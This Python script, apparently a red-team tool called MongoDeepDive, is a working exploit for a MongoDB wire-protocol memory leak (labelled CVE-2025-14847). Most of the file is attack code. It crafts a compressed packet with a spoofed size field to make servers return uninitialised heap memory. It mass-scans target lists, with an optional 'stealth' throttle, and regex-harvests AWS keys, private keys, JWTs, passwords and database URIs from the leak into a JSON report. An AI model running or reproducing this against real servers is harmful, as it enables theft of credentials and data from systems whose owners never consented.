#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MongoDeepDive
─────────────
Author: Tunahan Tekeoğlu
Role:   Security Architect & Red Team Lead
Target: MongoDB Wire Protocol Vulnerability (CVE-2025-14847)

Description:
    A high-performance, asynchronous vulnerability scanner and forensic analyzer.
    It leverages Shannon Entropy to detect uninitialized memory leaks in MongoDB 
    servers, distinguishing between empty padding (garbage) and high-value 
    secrets (Keys, Tokens, etc.).
"""

import asyncio
import struct
import zlib
import re
import math
import argparse
import json
import sys
import os
from datetime import datetime
from collections import Counter

# Third-party libraries
try:
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, MofNCompleteColumn
except ImportError:
    print("Error: 'rich' library is missing. Install it via: pip install rich")
    sys.exit(1)

console = Console()

# --- Configuration Constants ---
# 64KB is a standard page size for memory allocation, maximizing the chance 
# to hit interesting heap data without causing instability.
DEFAULT_LEAK_SIZE = 65536  
OP_COMPRESSED = 2012       # MongoDB Wire Protocol OpCode for Compressed Messages

# --- Intelligence Engine ---

class MemoryIntelligence:
    """
    Static utility class for analyzing raw memory bytes using mathematical heuristics
    and pattern matching to identify sensitive information.
    """

    @staticmethod
    def calculate_shannon_entropy(data: bytes) -> float:
        """
        Calculates the Shannon Entropy of a byte sequence.
        
        Entropy is a measure of randomness.
        - High Entropy (>4.5): Encrypted data, compressed keys, random tokens.
        - Low Entropy (<3.0): Text, logs, padding, repeated characters.
        """
        if not data: 
            return 0.0
        
        entropy = 0
        length = len(data)
        counts = Counter(data)
        
        for count in counts.values():
            p_x = count / length
            if p_x > 0:
                entropy -= p_x * math.log2(p_x)
        
        return entropy

    @staticmethod
    def classify_data(data: bytes):
        """
        Classifies a memory chunk based on its entropy and regex pattern matches.
        Returns: (entropy, classification, confidence, findings)
        """
        entropy = MemoryIntelligence.calculate_shannon_entropy(data)
        classification = "UNKNOWN"
        confidence = "LOW"
        findings = []
        
        # 1. Entropy-based Classification
        if entropy > 4.5:
            classification = "HIGH_ENTROPY (Key/Encrypted)"
            confidence = "HIGH"
        elif 3.5 < entropy <= 4.5:
            classification = "COMPLEX_TEXT/CODE"
            confidence = "MEDIUM"
        else:
            classification = "LOW_ENTROPY (Padding/Logs)"
            confidence = "LOW"

        # 2. Regex-based Pattern Matching (Forensics)
        # Decode bytes to string, ignoring errors for binary data
        decoded = data.decode('utf-8', errors='ignore')
        
        patterns = {
            "AWS_KEY": r"AKIA[0-9A-Z]{16}",
            "PRIVATE_KEY": r"-----BEGIN .* PRIVATE KEY-----",
            "JWT_TOKEN": r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}",
            "PASSWORD": r"(?i)(password|passwd|pwd|secret)\s*[:=]\s*[\"'](.*?)[\"']",
            "DB_URI": r"mongodb(\+srv)?://",
            "EMAIL": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        }

        for label, pattern in patterns.items():
            matches = re.findall(pattern, decoded)
            if matches:
                # Deduplicate matches
                unique_matches = list(set([m if isinstance(m, str) else m[0] for m in matches]))
                findings.extend([f"{label}: {m[:30]}..." for m in unique_matches])
                
                # Override classification if a specific secret is found
                classification = f"SECRET_EXPOSED ({label})"
                confidence = "CRITICAL"

        return entropy, classification, confidence, findings

    @staticmethod
    def clean_memory_dump(raw_data: bytes) -> list:
        """
        Filters out null bytes and splits the raw memory dump into meaningful chunks.
        This reduces noise by removing empty memory padding.
        """
        # Split by blocks of 4 or more non-printable/null characters
        # Only keep chunks larger than 16 bytes to avoid tiny fragments
        chunks = [chk for chk in re.split(b'[\x00-\x1F\x7F]{4,}', raw_data) if len(chk) > 16]
        return chunks

# --- Exploit Core ---

class MongoScanner:
    """
    Handles the network interaction and the exploit payload generation.
    """
    def __init__(self, timeout, safety_mode):
        self.timeout = timeout
        self.safety_mode = safety_mode

    def build_packet(self):
        """
        Constructs the malicious OP_COMPRESSED packet.
        
        Exploit Logic:
        We create a valid 'isMaster' command but wrap it in a compressed packet.
        Crucially, we lie about the 'uncompressed_size' field in the header.
        The server allocates this size (64KB) but only writes our tiny payload,
        leaving the rest of the buffer uninitialized (leaking heap memory).
        """
        # 1. Create a valid BSON payload (isMaster command)
        bson_payload = b'\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00'
        
        # 2. Wrap it in a standard OP_QUERY header
        op_query = struct.pack('<I', 0) + b'admin.$cmd\x00' + struct.pack('<ii', 0, -1)
        original_msg = op_query + bson_payload
        
        # 3. Compress the legitimate message
        compressed_body = zlib.compress(original_msg)

        # 4. Craft the Malicious OP_COMPRESSED header
        op_compressed = (
            struct.pack('<I', OP_COMPRESSED) +      # Original OpCode
            struct.pack('<I', DEFAULT_LEAK_SIZE) +  # SPOOFED Uncompressed Size (The Exploit)
            b'\x02' +                               # Compressor ID (zlib)
            compressed_body
        )
        
        # 5. Add the final MsgHeader
        # total_len, requestID (1337), responseTo, opCode
        header = struct.pack('<iiii', 16 + len(op_compressed), 1337, 0, OP_COMPRESSED)
        return header + op_compressed

    async def scan_host(self, host, port, packet_count):
        """
        Connects to the target and repeatedly triggers the memory leak.
        """
        host_results = []
        is_vulnerable = False
        max_response_len = 0 # Track the biggest leak size received
        
        for i in range(packet_count):
            try:
                # Establish connection
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port), timeout=self.timeout
                )
                
                # Send payload
                writer.write(self.build_packet())
                await writer.drain()

                # Read the response header (first 16 bytes)
                header = await asyncio.wait_for(reader.readexactly(16), timeout=self.timeout)
                resp_len, _, _, _ = struct.unpack('<iiii', header)

                # --- DETECTION LOGIC ---
                # A standard response is small (~50-100 bytes). 
                # If we get >1024 bytes, the server allocated and returned our spoofed buffer.
                if resp_len > 1024:
                    is_vulnerable = True
                    max_response_len = max(max_response_len, resp_len) 
                    
                    # Read the leaked memory body
                    body = await reader.readexactly(resp_len - 16)
                    
                    # Try to decompress. If it fails, it's likely raw memory garbage (which is good).
                    try:
                        leaked_data = zlib.decompress(body)
                    except:
                        leaked_data = body

                    # Analyze the leak for secrets
                    chunks = MemoryIntelligence.clean_memory_dump(leaked_data)
                    for chunk in chunks:
                        entropy, cls, conf, findings = MemoryIntelligence.classify_data(chunk)
                        
                        # Only record interesting findings to reduce noise
                        if conf in ["MEDIUM", "HIGH", "CRITICAL"]:
                            host_results.append({
                                "packet_id": i,
                                "entropy": round(entropy, 3),
                                "classification": cls,
                                "confidence": conf,
                                "findings": findings,
                                "preview": chunk.decode('utf-8', errors='ignore')[:80]
                            })

                # Clean up
                writer.close()
                await writer.wait_closed()
                
                # Throttling for stealth/safety
                if self.safety_mode: 
                    await asyncio.sleep(0.5)

            except Exception:
                # Connection errors are expected during mass scanning
                pass 
        
        return is_vulnerable, max_response_len, host_results

# --- Orchestrator ---

async def worker(sem, scanner, host, port, count, progress, task_id, all_data):
    """
    Async worker wrapper to handle concurrency and reporting.
    """
    async with sem:
        is_vuln, resp_size, findings = await scanner.scan_host(host, port, count)
        
        if is_vuln:
            # 1. SCANNER MODE: Report the vulnerability immediately based on response size
            console.print(f"[bold green][+] VULNERABLE: {host}:{port} | Response Size: {resp_size} bytes[/bold green]")
            
            # 2. DEEP DIVE MODE: Report if any actual secrets were found in the memory
            high_conf = [f for f in findings if f['confidence'] in ['HIGH', 'CRITICAL']]
            
            if high_conf:
                console.print(f"    [bold red]└── SECRETS FOUND:[/bold red] {len(high_conf)} critical blocks extracted")
                for item in high_conf[:2]: # Show top 2 findings to avoid terminal flooding
                    console.print(f"       [yellow]➜ {item['classification']}[/yellow]")
            else:
                console.print(f"    [dim]└── Leak confirmed, but memory content is currently empty/low-entropy.[/dim]")
            
            if findings:
                all_data[f"{host}:{port}"] = findings
                
        progress.advance(task_id)

async def main():
    # Argument Parsing
    parser = argparse.ArgumentParser(
        description="MongoDeepDive: Advanced CVE-2025-14847 Heuristics Analyzer",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-t", "--target", help="Single target IP/Domain")
    parser.add_argument("-l", "--list", help="File containing list of targets")
    parser.add_argument("-p", "--port", type=int, default=27017, help="Target port (default: 27017)")
    parser.add_argument("-c", "--concurrency", type=int, default=20, help="Max concurrent connections")
    parser.add_argument("-n", "--count", type=int, default=5, help="Number of packets per host (Depth)")
    parser.add_argument("--timeout", type=int, default=5, help="Socket timeout")
    parser.add_argument("--safe", action="store_true", help="Enable throttling for production safety")
    parser.add_argument("-o", "--output", default="mongo_audit.json", help="Output JSON file for results")
    args = parser.parse_args()

    # Input Validation
    targets = []
    if args.target: 
        targets.append(args.target)
    if args.list and os.path.exists(args.list):
        with open(args.list, 'r') as f: 
            targets.extend([l.strip() for l in f if l.strip()])

    if not targets:
        console.print("[bold red]Error:[/bold red] Please provide a target (-t) or a list file (-l).")
        sys.exit(1)

    # Banner
    console.rule("[bold blue]MongoDeepDive - Tunahan Tekeoğlu[/bold blue]")
    console.print(f"[*] Loaded [bold cyan]{len(targets)}[/bold cyan] targets.")
    console.print(f"[*] Intelligence Engine: [bold green]Active[/bold green]")
    console.print(f"[*] Mode: {'[yellow]Stealth/Safe[/yellow]' if args.safe else '[red]Aggressive[/red]'}")

    # Initialization
    scanner = MongoScanner(args.timeout, args.safe)
    sem = asyncio.Semaphore(args.concurrency)
    all_data = {}

    # Execution with Progress Bar
    with Progress(
        SpinnerColumn(), 
        TextColumn("[progress.description]{task.description}"),
        BarColumn(), 
        MofNCompleteColumn(), 
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Scanning...", total=len(targets))
        coroutines = []
        
        for t in targets:
            # Handle IP:PORT format in list files
            if ":" in t:
                host, port_str = t.split(":")
                port_val = int(port_str)
            else:
                host, port_val = t, args.port
                
            coroutines.append(worker(sem, scanner, host, port_val, args.count, progress, task, all_data))
        
        await asyncio.gather(*coroutines)

    # Final Reporting
    if all_data:
        with open(args.output, 'w') as f: 
            json.dump(all_data, f, indent=4)
        console.print(f"\n[bold green]Scan Complete.[/bold green] Detailed report saved to: [bold white]{args.output}[/bold white]")
    else:
        console.print("\n[yellow]Scan Complete. No significant data leaked.[/yellow]")

if __name__ == "__main__":
    try: 
        asyncio.run(main())
    except KeyboardInterrupt: 
        console.print("\n[red]Aborted by user.[/red]")
